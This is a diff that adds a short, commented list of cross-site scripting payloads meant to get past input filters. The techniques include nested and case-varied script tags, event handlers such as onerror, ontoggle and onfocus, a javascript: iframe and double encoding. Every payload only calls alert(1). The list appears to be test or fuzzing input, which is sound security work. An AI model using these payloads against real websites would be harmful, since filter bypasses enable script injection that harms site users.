@@ -1,0 +1,17 @@
+# Filter evasion XSS payloads
+# Nested tags to bypass naive <script> filters
+<scr<script>ipt>alert(1)</scr<script>ipt>
+# Quoted event handler
+<img src=x onerror="alert(1)">
+# JavaScript pseudo-protocol in iframe
+<iframe src="javascript:alert(1)">
+# ontoggle event on details
+<details open ontoggle=alert(1)>
+# Autofocus + onfocus
+<input onfocus=alert(1) autofocus>
+# onchange on select
+<select onchange=alert(1)><option>1</option><option>2</option></select>
+# Case variation
+<ScRiPt>alert(1)</ScRiPt>
+# Double encoding
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
